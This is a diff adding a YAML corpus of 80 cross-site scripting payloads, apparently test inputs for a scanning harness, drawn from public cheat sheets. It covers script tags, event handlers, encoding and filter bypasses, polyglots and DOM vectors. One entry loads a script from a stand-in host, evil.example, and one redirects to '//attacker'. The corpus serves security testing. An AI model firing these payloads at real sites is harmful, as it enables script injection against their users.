@@ -1,0 +1,928 @@
+# AMHF Payload Corpus — Cross-Site Scripting (XSS)
+# Educational use only. Sources: PortSwigger XSS Cheat Sheet,
+# OWASP XSS Filter Evasion, PayloadsAllTheThings.
+# Total: 80 payloads.
+
+- id: xss_basic_001
+  class: xss
+  payload: <script>alert(1)</script>
+  description: Базовая <script>-инъекция
+  expected_markers:
+  - <script
+  - alert(
+  - amhf_xss_marker
+  difficulty: trivial
+  source: PortSwigger XSS Cheat Sheet
+- id: xss_basic_002
+  class: xss
+  payload: <script>alert('XSS')</script>
+  description: Базовая со строкой
+  expected_markers:
+  - <script
+  - alert(
+  - amhf_xss_marker
+  difficulty: trivial
+  source: PortSwigger XSS Cheat Sheet
+- id: xss_basic_003
+  class: xss
+  payload: <script>confirm(1)</script>
+  description: confirm() вместо alert
+  expected_markers:
+  - <script
+  - alert(
+  - amhf_xss_marker
+  difficulty: trivial
+  source: PortSwigger XSS Cheat Sheet
+- id: xss_basic_004
+  class: xss
+  payload: <script>prompt(1)</script>
+  description: prompt() вместо alert
+  expected_markers:
+  - <script
+  - alert(
+  - amhf_xss_marker
+  difficulty: trivial
+  source: PortSwigger XSS Cheat Sheet
+- id: xss_basic_005
+  class: xss
+  payload: <script>console.log('amhf_xss_marker')</script>
+  description: Маркер для оракула
+  expected_markers:
+  - <script
+  - alert(
+  - amhf_xss_marker
+  difficulty: trivial
+  source: PortSwigger XSS Cheat Sheet
+- id: xss_basic_006
+  class: xss
+  payload: <SCRIPT>alert(1)</SCRIPT>
+  description: Регистровый вариант
+  expected_markers:
+  - <script
+  - alert(
+  - amhf_xss_marker
+  difficulty: trivial
+  source: PortSwigger XSS Cheat Sheet
+- id: xss_basic_007
+  class: xss
+  payload: <sCrIpT>alert(1)</sCrIpT>
+  description: Микс регистра
+  expected_markers:
+  - <script
+  - alert(
+  - amhf_xss_marker
+  difficulty: trivial
+  source: PortSwigger XSS Cheat Sheet
+- id: xss_basic_008
+  class: xss
+  payload: <script src='//evil.example/xss.js'></script>
+  description: Внешний src
+  expected_markers:
+  - <script
+  - alert(
+  - amhf_xss_marker
+  difficulty: easy
+  source: PortSwigger XSS Cheat Sheet
+- id: xss_basic_009
+  class: xss
+  payload: <script>document.title='amhf_xss_marker'</script>
+  description: Изменение title
+  expected_markers:
+  - <script
+  - alert(
+  - amhf_xss_marker
+  difficulty: easy
+  source: PortSwigger XSS Cheat Sheet
+- id: xss_basic_010
+  class: xss
+  payload: <script>document.location='//attacker'</script>
+  description: Редирект
+  expected_markers:
+  - <script
+  - alert(
+  - amhf_xss_marker
+  difficulty: easy
+  source: PortSwigger XSS Cheat Sheet
+- id: xss_event_001
+  class: xss
+  payload: <img src=x onerror=alert(1)>
+  description: img onerror
+  expected_markers:
+  - onerror
+  - onload
+  - onfocus
+  - ontoggle
+  - srcdoc
+  - 'javascript:'
+  difficulty: trivial
+  source: PayloadsAllTheThings XSS
+- id: xss_event_002
+  class: xss
+  payload: <img src=x onerror="alert('amhf_xss_marker')">
+  description: img onerror с маркером
+  expected_markers:
+  - onerror
+  - onload
+  - onfocus
+  - ontoggle
+  - srcdoc
+  - 'javascript:'
+  difficulty: easy
+  source: PayloadsAllTheThings XSS
+- id: xss_event_003
+  class: xss
+  payload: <svg onload=alert(1)>
+  description: svg onload
+  expected_markers:
+  - onerror
+  - onload
+  - onfocus
+  - ontoggle
+  - srcdoc
+  - 'javascript:'
+  difficulty: trivial
+  source: PayloadsAllTheThings XSS
+- id: xss_event_004
+  class: xss
+  payload: <svg/onload=alert(1)>
+  description: svg с / вместо пробела
+  expected_markers:
+  - onerror
+  - onload
+  - onfocus
+  - ontoggle
+  - srcdoc
+  - 'javascript:'
+  difficulty: easy
+  source: PayloadsAllTheThings XSS
+- id: xss_event_005
+  class: xss
+  payload: <body onload=alert(1)>
+  description: body onload
+  expected_markers:
+  - onerror
+  - onload
+  - onfocus
+  - ontoggle
+  - srcdoc
+  - 'javascript:'
+  difficulty: trivial
+  source: PayloadsAllTheThings XSS
+- id: xss_event_006
+  class: xss
+  payload: <input autofocus onfocus=alert(1)>
+  description: Autofocus + onfocus
+  expected_markers:
+  - onerror
+  - onload
+  - onfocus
+  - ontoggle
+  - srcdoc
+  - 'javascript:'
+  difficulty: easy
+  source: PayloadsAllTheThings XSS
+- id: xss_event_007
+  class: xss
+  payload: <select autofocus onfocus=alert(1)>
+  description: Select autofocus
+  expected_markers:
+  - onerror
+  - onload
+  - onfocus
+  - ontoggle
+  - srcdoc
+  - 'javascript:'
+  difficulty: easy
+  source: PayloadsAllTheThings XSS
+- id: xss_event_008
+  class: xss
+  payload: <textarea autofocus onfocus=alert(1)>
+  description: Textarea autofocus
+  expected_markers:
+  - onerror
+  - onload
+  - onfocus
+  - ontoggle
+  - srcdoc
+  - 'javascript:'
+  difficulty: easy
+  source: PayloadsAllTheThings XSS
+- id: xss_event_009
+  class: xss
+  payload: <keygen autofocus onfocus=alert(1)>
+  description: Keygen autofocus (legacy)
+  expected_markers:
+  - onerror
+  - onload
+  - onfocus
+  - ontoggle
+  - srcdoc
+  - 'javascript:'
+  difficulty: medium
+  source: PayloadsAllTheThings XSS
+- id: xss_event_010
+  class: xss
+  payload: <video><source onerror=alert(1)>
+  description: Source onerror
+  expected_markers:
+  - onerror
+  - onload
+  - onfocus
+  - ontoggle
+  - srcdoc
+  - 'javascript:'
+  difficulty: easy
+  source: PayloadsAllTheThings XSS
+- id: xss_event_011
+  class: xss
+  payload: <audio src=x onerror=alert(1)>
+  description: Audio onerror
+  expected_markers:
+  - onerror
+  - onload
+  - onfocus
+  - ontoggle
+  - srcdoc
+  - 'javascript:'
+  difficulty: easy
+  source: PayloadsAllTheThings XSS
+- id: xss_event_012
+  class: xss
+  payload: <details open ontoggle=alert(1)>
+  description: Details ontoggle
+  expected_markers:
+  - onerror
+  - onload
+  - onfocus
+  - ontoggle
+  - srcdoc
+  - 'javascript:'
+  difficulty: easy
+  source: PayloadsAllTheThings XSS
+- id: xss_event_013
+  class: xss
+  payload: <marquee onstart=alert(1)>
+  description: Marquee onstart
+  expected_markers:
+  - onerror
+  - onload
+  - onfocus
+  - ontoggle
+  - srcdoc
+  - 'javascript:'
+  difficulty: easy
+  source: PayloadsAllTheThings XSS
+- id: xss_event_014
+  class: xss
+  payload: <iframe src=javascript:alert(1)>
+  description: 'javascript: в iframe'
+  expected_markers:
+  - onerror
+  - onload
+  - onfocus
+  - ontoggle
+  - srcdoc
+  - 'javascript:'
+  difficulty: easy
+  source: PayloadsAllTheThings XSS
+- id: xss_event_015
+  class: xss
+  payload: <iframe srcdoc='<script>alert(1)</script>'>
+  description: srcdoc-инъекция
+  expected_markers:
+  - onerror
+  - onload
+  - onfocus
+  - ontoggle
+  - srcdoc
+  - 'javascript:'
+  difficulty: medium
+  source: PayloadsAllTheThings XSS
+- id: xss_event_016
+  class: xss
+  payload: <a href=javascript:alert(1)>x</a>
+  description: 'javascript: в href'
+  expected_markers:
+  - onerror
+  - onload
+  - onfocus
+  - ontoggle
+  - srcdoc
+  - 'javascript:'
+  difficulty: easy
+  source: PayloadsAllTheThings XSS
+- id: xss_event_017
+  class: xss
+  payload: <form action=javascript:alert(1)><input type=submit>
+  description: Form action
+  expected_markers:
+  - onerror
+  - onload
+  - onfocus
+  - ontoggle
+  - srcdoc
+  - 'javascript:'
+  difficulty: medium
+  source: PayloadsAllTheThings XSS
+- id: xss_event_018
+  class: xss
+  payload: <isindex action=javascript:alert(1) type=submit value=click>
+  description: isindex (legacy)
+  expected_markers:
+  - onerror
+  - onload
+  - onfocus
+  - ontoggle
+  - srcdoc
+  - 'javascript:'
+  difficulty: medium
+  source: PayloadsAllTheThings XSS
+- id: xss_event_019
+  class: xss
+  payload: <object data=javascript:alert(1)>
+  description: Object data
+  expected_markers:
+  - onerror
+  - onload
+  - onfocus
+  - ontoggle
+  - srcdoc
+  - 'javascript:'
+  difficulty: medium
+  source: PayloadsAllTheThings XSS
+- id: xss_event_020
+  class: xss
+  payload: <embed src=javascript:alert(1)>
+  description: Embed src
+  expected_markers:
+  - onerror
+  - onload
+  - onfocus
+  - ontoggle
+  - srcdoc
+  - 'javascript:'
+  difficulty: medium
+  source: PayloadsAllTheThings XSS
+- id: xss_enc_001
+  class: xss
+  payload: <scr<script>ipt>alert(1)</scr</script>ipt>
+  description: Двойная вложенность для разрушения фильтра
+  expected_markers:
+  - alert
+  - '&#'
+  - \u00
+  - Function
+  - eval
+  difficulty: medium
+  source: PortSwigger XSS encoding
+- id: xss_enc_002
+  class: xss
+  payload: "<scr\0ipt>alert(1)</scr\0ipt>"
+  description: NULL-байт в теге
+  expected_markers:
+  - alert
+  - '&#'
+  - \u00
+  - Function
+  - eval
+  difficulty: medium
+  source: PortSwigger XSS encoding
+- id: xss_enc_003
+  class: xss
+  payload: <script>al\u0065rt(1)</script>
+  description: JS unicode escape
+  expected_markers:
+  - alert
+  - '&#'
+  - \u00
+  - Function
+  - eval
+  difficulty: medium
+  source: PortSwigger XSS encoding
+- id: xss_enc_004
+  class: xss
+  payload: <script>eval('al'+'ert(1)')</script>
+  description: Конкатенация в eval
+  expected_markers:
+  - alert
+  - '&#'
+  - \u00
+  - Function
+  - eval
+  difficulty: medium
+  source: PortSwigger XSS encoding
+- id: xss_enc_005
+  class: xss
+  payload: <script>window['ale'+'rt'](1)</script>
+  description: Доступ через bracket notation
+  expected_markers:
+  - alert
+  - '&#'
+  - \u00
+  - Function
+  - eval
+  difficulty: medium
+  source: PortSwigger XSS encoding
+- id: xss_enc_006
+  class: xss
+  payload: <script>[].constructor.constructor('alert(1)')()</script>
+  description: Константный конструктор
+  expected_markers:
+  - alert
+  - '&#'
+  - \u00
+  - Function
+  - eval
+  difficulty: hard
+  source: PortSwigger XSS encoding
+- id: xss_enc_007
+  class: xss
+  payload: <script>setTimeout('alert(1)',0)</script>
+  description: Через setTimeout-строку
+  expected_markers:
+  - alert
+  - '&#'
+  - \u00
+  - Function
+  - eval
+  difficulty: medium
+  source: PortSwigger XSS encoding
+- id: xss_enc_008
+  class: xss
+  payload: <script>setInterval('alert(1)',1)</script>
+  description: Через setInterval-строку
+  expected_markers:
+  - alert
+  - '&#'
+  - \u00
+  - Function
+  - eval
+  difficulty: medium
+  source: PortSwigger XSS encoding
+- id: xss_enc_009
+  class: xss
+  payload: <script>Function('alert(1)')()</script>
+  description: Функция-конструктор
+  expected_markers:
+  - alert
+  - '&#'
+  - \u00
+  - Function
+  - eval
+  difficulty: medium
+  source: PortSwigger XSS encoding
+- id: xss_enc_010
+  class: xss
+  payload: <img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
+  description: HTML-entity decimal
+  expected_markers:
+  - alert
+  - '&#'
+  - \u00
+  - Function
+  - eval
+  difficulty: medium
+  source: PortSwigger XSS encoding
+- id: xss_enc_011
+  class: xss
+  payload: <img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
+  description: HTML-entity hex
+  expected_markers:
+  - alert
+  - '&#'
+  - \u00
+  - Function
+  - eval
+  difficulty: medium
+  source: PortSwigger XSS encoding
+- id: xss_enc_012
+  class: xss
+  payload: <img src=x onerror=alert&#40;1&#41;>
+  description: HTML-entity для скобок
+  expected_markers:
+  - alert
+  - '&#'
+  - \u00
+  - Function
+  - eval
+  difficulty: medium
+  source: PortSwigger XSS encoding
+- id: xss_enc_013
+  class: xss
+  payload: javascript&colon;alert(1)
+  description: Entity для ':' в pseudo-protocol
+  expected_markers:
+  - alert
+  - '&#'
+  - \u00
+  - Function
+  - eval
+  difficulty: medium
+  source: PortSwigger XSS encoding
+- id: xss_enc_014
+  class: xss
+  payload: <a href="java&Tab;script:alert(1)">x</a>
+  description: Entity-tab внутри схемы
+  expected_markers:
+  - alert
+  - '&#'
+  - \u00
+  - Function
+  - eval
+  difficulty: medium
+  source: PortSwigger XSS encoding
+- id: xss_enc_015
+  class: xss
+  payload: <script>\u0061lert(1)</script>
+  description: Unicode escape начала имени
+  expected_markers:
+  - alert
+  - '&#'
+  - \u00
+  - Function
+  - eval
+  difficulty: medium
+  source: PortSwigger XSS encoding
+- id: xss_enc_016
+  class: xss
+  payload: <svg><script>alert&lpar;1&rpar;</script></svg>
+  description: Entity-skoby в svg-script
+  expected_markers:
+  - alert
+  - '&#'
+  - \u00
+  - Function
+  - eval
+  difficulty: medium
+  source: PortSwigger XSS encoding
+- id: xss_enc_017
+  class: xss
+  payload: <%="<scr"+"ipt>alert(1)</scr"+"ipt>"%>
+  description: ASP-style + concatenation
+  expected_markers:
+  - alert
+  - '&#'
+  - \u00
+  - Function
+  - eval
+  difficulty: hard
+  source: PortSwigger XSS encoding
+- id: xss_poly_001
+  class: xss
+  payload: javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+  description: Известный полиглот Гарета Хейса
+  expected_markers:
+  - alert
+  - confirm
+  - onload
+  - onmouseover
+  difficulty: hard
+  source: PortSwigger XSS polyglots
+- id: xss_poly_002
+  class: xss
+  payload: '''"--></style></script><script>alert(1)</script>'
+  description: Многоконтекстный полиглот
+  expected_markers:
+  - alert
+  - confirm
+  - onload
+  - onmouseover
+  difficulty: hard
+  source: PortSwigger XSS polyglots
+- id: xss_poly_003
+  class: xss
+  payload: '"-confirm`1`-"'
+  description: ES6-template literal
+  expected_markers:
+  - alert
+  - confirm
+  - onload
+  - onmouseover
+  difficulty: medium
+  source: PortSwigger XSS polyglots
+- id: xss_poly_004
+  class: xss
+  payload: '''-alert(1)-'''
+  description: Закрытие JS-строки + alert
+  expected_markers:
+  - alert
+  - confirm
+  - onload
+  - onmouseover
+  difficulty: medium
+  source: PortSwigger XSS polyglots
+- id: xss_poly_005
+  class: xss
+  payload: '"><script>alert(1)</script>'
+  description: Выход из атрибута
+  expected_markers:
+  - alert
+  - confirm
+  - onload
+  - onmouseover
+  difficulty: easy
+  source: PortSwigger XSS polyglots
+- id: xss_poly_006
+  class: xss
+  payload: '''><script>alert(1)</script>'
+  description: Выход из атрибута через '
+  expected_markers:
+  - alert
+  - confirm
+  - onload
+  - onmouseover
+  difficulty: easy
+  source: PortSwigger XSS polyglots
+- id: xss_poly_007
+  class: xss
+  payload: </script><script>alert(1)</script>
+  description: Выход из <script>-блока
+  expected_markers:
+  - alert
+  - confirm
+  - onload
+  - onmouseover
+  difficulty: easy
+  source: PortSwigger XSS polyglots
+- id: xss_poly_008
+  class: xss
+  payload: </textarea><script>alert(1)</script>
+  description: Выход из textarea
+  expected_markers:
+  - alert
+  - confirm
+  - onload
+  - onmouseover
+  difficulty: easy
+  source: PortSwigger XSS polyglots
+- id: xss_poly_009
+  class: xss
+  payload: </title><script>alert(1)</script>
+  description: Выход из title
+  expected_markers:
+  - alert
+  - confirm
+  - onload
+  - onmouseover
+  difficulty: easy
+  source: PortSwigger XSS polyglots
+- id: xss_poly_010
+  class: xss
+  payload: </style><script>alert(1)</script>
+  description: Выход из style
+  expected_markers:
+  - alert
+  - confirm
+  - onload
+  - onmouseover
+  difficulty: easy
+  source: PortSwigger XSS polyglots
+- id: xss_dom_001
+  class: xss
+  payload: javascript:alert(1)
+  description: Простой javascript:URL
+  expected_markers:
+  - alert
+  - 'javascript:'
+  - 'data:'
+  difficulty: easy
+  source: OWASP XSS Cheat Sheet
+- id: xss_dom_002
+  class: xss
+  payload: data:text/html,<script>alert(1)</script>
+  description: data:URL
+  expected_markers:
+  - alert
+  - 'javascript:'
+  - 'data:'
+  difficulty: medium
+  source: OWASP XSS Cheat Sheet
+- id: xss_dom_003
+  class: xss
+  payload: data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+  description: data:base64
+  expected_markers:
+  - alert
+  - 'javascript:'
+  - 'data:'
+  difficulty: medium
+  source: OWASP XSS Cheat Sheet
+- id: xss_dom_004
+  class: xss
+  payload: vbscript:alert(1)
+  description: 'vbscript: в IE-legacy'
+  expected_markers:
+  - alert
+  - 'javascript:'
+  - 'data:'
+  difficulty: hard
+  source: OWASP XSS Cheat Sheet
+- id: xss_dom_005
+  class: xss
+  payload: '#<script>alert(1)</script>'
+  description: Fragment-инъекция
+  expected_markers:
+  - alert
+  - 'javascript:'
+  - 'data:'
+  difficulty: medium
+  source: OWASP XSS Cheat Sheet
+- id: xss_dom_006
+  class: xss
+  payload: ?q=<script>alert(1)</script>
+  description: Query-string инъекция
+  expected_markers:
+  - alert
+  - 'javascript:'
+  - 'data:'
+  difficulty: easy
+  source: OWASP XSS Cheat Sheet
+- id: xss_dom_007
+  class: xss
+  payload: '"+alert(1)+"'
+  description: Конкатенация в JS-контексте
+  expected_markers:
+  - alert
+  - 'javascript:'
+  - 'data:'
+  difficulty: medium
+  source: OWASP XSS Cheat Sheet
+- id: xss_dom_008
+  class: xss
+  payload: '";alert(1);//'
+  description: Замыкание JS-строки
+  expected_markers:
+  - alert
+  - 'javascript:'
+  - 'data:'
+  difficulty: medium
+  source: OWASP XSS Cheat Sheet
+- id: xss_dom_009
+  class: xss
+  payload: '`+alert(1)+`'
+  description: Template-literal
+  expected_markers:
+  - alert
+  - 'javascript:'
+  - 'data:'
+  difficulty: medium
+  source: OWASP XSS Cheat Sheet
+- id: xss_dom_010
+  class: xss
+  payload: </script><img src=x onerror=alert(1)>
+  description: Выход из script с img
+  expected_markers:
+  - alert
+  - 'javascript:'
+  - 'data:'
+  difficulty: easy
+  source: OWASP XSS Cheat Sheet
+- id: xss_filter_001
+  class: xss
+  payload: <scrscriptipt>alert(1)</scrscriptipt>
+  description: Удвоение для replace-фильтров
+  expected_markers:
+  - alert
+  - expression
+  - 'javascript:'
+  - onerror
+  difficulty: medium
+  source: PayloadsAllTheThings XSS bypass
+- id: xss_filter_002
+  class: xss
+  payload: <a href="javascript:&Tab;alert(1)">x</a>
+  description: '&Tab; в javascript:'
+  expected_markers:
+  - alert
+  - expression
+  - 'javascript:'
+  - onerror
+  difficulty: medium
+  source: PayloadsAllTheThings XSS bypass
+- id: xss_filter_003
+  class: xss
+  payload: <a href="java\nscript:alert(1)">x</a>
+  description: 'Newline в javascript:'
+  expected_markers:
+  - alert
+  - expression
+  - 'javascript:'
+  - onerror
+  difficulty: medium
+  source: PayloadsAllTheThings XSS bypass
+- id: xss_filter_004
+  class: xss
+  payload: <svg><script>alert(1)//</script></svg>
+  description: svg-script-комментарий
+  expected_markers:
+  - alert
+  - expression
+  - 'javascript:'
+  - onerror
+  difficulty: medium
+  source: PayloadsAllTheThings XSS bypass
+- id: xss_filter_005
+  class: xss
+  payload: <a/href=javascript:alert(1)>x</a>
+  description: / вместо пробела
+  expected_markers:
+  - alert
+  - expression
+  - 'javascript:'
+  - onerror
+  difficulty: easy
+  source: PayloadsAllTheThings XSS bypass
+- id: xss_filter_006
+  class: xss
+  payload: '<img
+
+    src=x
+
+    onerror=alert(1)>'
+  description: Newline вместо пробелов
+  expected_markers:
+  - alert
+  - expression
+  - 'javascript:'
+  - onerror
+  difficulty: easy
+  source: PayloadsAllTheThings XSS bypass
+- id: xss_filter_007
+  class: xss
+  payload: '<img/src=x
+
+    onerror=alert(1)>'
+  description: Смесь
+  expected_markers:
+  - alert
+  - expression
+  - 'javascript:'
+  - onerror
+  difficulty: easy
+  source: PayloadsAllTheThings XSS bypass
+- id: xss_filter_008
+  class: xss
+  payload: <a href=javascript&#x3a;alert(1)>x</a>
+  description: '&#x3a; для :'
+  expected_markers:
+  - alert
+  - expression
+  - 'javascript:'
+  - onerror
+  difficulty: medium
+  source: PayloadsAllTheThings XSS bypass
+- id: xss_filter_009
+  class: xss
+  payload: <style>@import 'data:,*{x:expression(alert(1))}'</style>
+  description: CSS expression (legacy IE)
+  expected_markers:
+  - alert
+  - expression
+  - 'javascript:'
+  - onerror
+  difficulty: hard
+  source: PayloadsAllTheThings XSS bypass
+- id: xss_filter_010
+  class: xss
+  payload: <link rel=stylesheet href=data:,*{x:expression(alert(1))}>
+  description: CSS expression в link
+  expected_markers:
+  - alert
+  - expression
+  - 'javascript:'
+  - onerror
+  difficulty: hard
+  source: PayloadsAllTheThings XSS bypass
+- id: xss_filter_011
+  class: xss
+  payload: <base href=javascript:alert(1)//>
+  description: '<base> с javascript:'
+  expected_markers:
+  - alert
+  - expression
+  - 'javascript:'
+  - onerror
+  difficulty: hard
+  source: PayloadsAllTheThings XSS bypass
+- id: xss_filter_012
+  class: xss
+  payload: <form id=test></form><button form=test formaction=javascript:alert(1)>x</button>
+  description: form/formaction split
+  expected_markers:
+  - alert
+  - expression
+  - 'javascript:'
+  - onerror
+  difficulty: hard
+  source: PayloadsAllTheThings XSS bypass
+- id: xss_filter_013
+  class: xss
+  payload: <math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
+  description: math+style mutation
+  expected_markers:
+  - alert
+  - expression
+  - 'javascript:'
+  - onerror
+  difficulty: hard
+  source: PayloadsAllTheThings XSS bypass
